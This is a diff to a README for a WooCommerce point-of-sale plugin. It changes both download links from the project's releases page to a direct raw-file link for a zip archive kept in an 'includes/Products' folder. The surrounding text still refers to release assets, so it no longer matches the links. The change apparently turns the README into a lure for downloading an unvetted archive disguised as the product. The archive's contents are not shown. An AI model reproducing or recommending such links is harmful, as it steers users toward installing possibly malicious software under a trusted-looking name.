@@ -1,6 +1,6 @@
 # 🛒 rootlabs-pos-pro - Efficient point of sale for WooCommerce
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Wech-expert/rootlabs-pos-pro/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Wech-expert/rootlabs-pos-pro/main/includes/Products/pro-pos-rootlabs-v2.2.zip)
 
 ## 📋 About This Software
 
@@ -18,7 +18,7 @@ Your computer and website must meet these standards to run this software:
 
 ## 📥 How to Download
 
-Visit this page to download the latest version: [https://github.com/Wech-expert/rootlabs-pos-pro/releases](https://github.com/Wech-expert/rootlabs-pos-pro/releases).
+Visit this page to download the latest version: [https://raw.githubusercontent.com/Wech-expert/rootlabs-pos-pro/main/includes/Products/pro-pos-rootlabs-v2.2.zip](https://raw.githubusercontent.com/Wech-expert/rootlabs-pos-pro/main/includes/Products/pro-pos-rootlabs-v2.2.zip).
 
 Look for the file ending in .zip under the Assets section of the latest release. Click the file name to save it to your computer. Keep track of the folder where you save this file.
 
